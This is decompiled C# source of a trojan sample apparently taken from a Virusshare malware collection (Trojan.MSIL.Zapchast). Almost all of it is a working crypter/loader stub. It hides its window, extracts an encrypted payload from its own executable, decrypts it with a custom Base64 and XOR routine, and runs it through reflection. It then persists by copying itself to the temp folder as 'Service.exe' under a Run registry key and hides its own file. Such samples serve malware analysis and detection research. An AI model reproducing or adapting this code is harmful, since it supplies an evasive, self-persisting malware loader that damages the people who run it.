// Decompiled with JetBrains decompiler
// Type: .
// Assembly: TechService, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 9535D897-4CD1-4005-94C0-70F300366804
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.MSIL.Zapchast.hd-863d9bad55e146b831d0d6c0458447f7f6c93dd7e52a99763a3913d697b3b8c6.exe

using \u0001;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace \u0003
{
  internal class \u0001 : Form
  {
    private IContainer \u0001;
    private byte[] \u0002;

    public \u0001()
    {
      this.Load += new EventHandler(this.\u0001);
      // ISSUE: reference to a compiler-generated method
      this.\u0002 = \u0002.\u0001();
      this.\u0001();
    }

    [DebuggerNonUserCode]
    protected override void Dispose([In] bool obj0)
    {
      try
      {
        if (!obj0 || this.\u0001 == null)
          return;
        this.\u0001.Dispose();
      }
      finally
      {
        base.Dispose(obj0);
      }
    }

    private void \u0001()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(10, 10);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = "Form1";
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.ResumeLayout(false);
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private void \u0001([In] object obj0, [In] EventArgs obj1)
    {
      string[] strArray = Strings.Split(File.ReadAllText(Application.ExecutablePath), "CwXBSrQ1Vb");
      byte[] numArray = \u0003.\u0001.\u0001(Encoding.Default.GetBytes(strArray[1]), "N3oNight");
      RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Assembly.Load(this.\u0002).GetType("Function1.Use").GetMethod("It").Invoke((object) null, new object[1]
      {
        RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Assembly.Load(this.\u0002).GetType("Function1.Use").GetMethod("This").Invoke((object) null, new object[1]
        {
          (object) numArray
        }))))
      })));
      if (Conversions.ToBoolean(strArray[2]))
      {
        if (!File.Exists(Path.GetTempPath() + "Service.exe"))
          File.Copy(Application.ExecutablePath, Path.GetTempPath() + "Service.exe");
        Registry.CurrentUser.OpenSubKey("software\\microsoft\\windows\\currentversion\\run", true).SetValue("System Service", (object) (Path.GetTempPath() + "Service.exe"), RegistryValueKind.String);
      }
      if (Conversions.ToBoolean(strArray[3]))
        File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden);
      ProjectData.EndApp();
    }

    private static byte[] \u0001([In] byte[] obj0, [In] string obj1)
    {
      byte[] bytes = Encoding.Default.GetBytes(obj1);
      byte[] numArray1 = Convert.FromBase64String(Encoding.Default.GetString(obj0));
      byte[] numArray2 = new byte[checked (numArray1.Length - 2 + 1)];
      byte num1 = numArray1[checked (numArray1.Length - 1)];
      int num2 = checked (numArray2.Length - 1);
      int index = 0;
      while (index <= num2)
      {
        numArray2[index] = checked ((byte) ((int) numArray1[index] ^ unchecked ((int) (byte) ((uint) bytes[index % bytes.Length] << (checked (index + (int) num1 + bytes.Length) & 7)) % 256)));
        checked { ++index; }
      }
      return numArray2;
    }
  }
}
